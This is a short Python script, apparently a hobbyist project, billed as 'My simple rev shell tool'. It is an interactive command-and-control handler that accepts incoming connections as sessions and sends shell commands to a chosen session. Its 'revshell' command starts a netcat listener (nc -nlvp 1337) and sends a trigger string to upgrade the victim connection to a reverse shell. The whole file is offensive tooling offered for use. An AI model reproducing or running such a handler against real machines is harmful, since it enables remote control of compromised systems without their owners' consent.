#!/usr/bin/python3

import argparse
from cmd2 import Cmd, with_argparser
import os
import threading
import socket
import multiprocessing
import time
connections = []
addresses = []
current_session = None


class base(Cmd, object):

    def do_clear(self, args):
        """Clear the screen"""
        os.system("clear")

    def emptyline(self):
        pass

class main(base):

    prompt = "> "
    intro = "========================\nMy simple rev shell tool\n========================"


    listen_args = argparse.ArgumentParser()
    listen_args.add_argument('port', help = 'Port for your local system to listen on')

    @with_argparser(listen_args)
    def do_listen(self, args):
        port = args.port
        t = threading.Thread(target=listen, args=[port])
        t.daemon = True
        t.start()
        print(f"Now listening on port {port}")

    def do_show_connections(self, args):
        show_connections()


    def do_send(self, args):
        connections[current_session].send((str(args) + "\n").encode())
        data = connections[current_session].recv(1024)
        print(data.decode())

    select_args = argparse.ArgumentParser()
    select_args.add_argument("session", help = "The session number to start interacting with")
    @with_argparser(select_args)
    def do_select(self, args):
        try:
            if connections[abs(int(args.session))]:

                global current_session
                current_session = int(args.session)
                self.prompt= (f"Session {current_session}> ")
        except:
            print("Session Doesnt exsist")

    def do_detach(self, args):
        global current_session
        current_session = None
        self.prompt= ("> ")

    def do_show_session(self, args):
        print(current_session)

    def do_revshell(self, args):
        p = multiprocessing.Process(target = start_revshell)
        p.start()
        connections[current_session].send("gimme\n".encode())
        p.join()

def start_revshell():
    os.system("nc -nlvp 1337")

def listen(setport):
    host = "127.0.0.1"
    port = int(setport)
    global s
    s = socket.socket()
    s.bind((host, port))
    s.listen(5)

    while True:
        conn, address = s.accept()
        print(f"Connection from {address[0]}:{address[1]}")
        conn.setblocking(1)

        connections.append(conn)
        addresses.append(address)

def show_connections():
    for index,item in enumerate(connections):
        print(f"Session {index}: {addresses[index][0]}")

if __name__ == "__main__":
    os.system("clear")
    main().cmdloop()
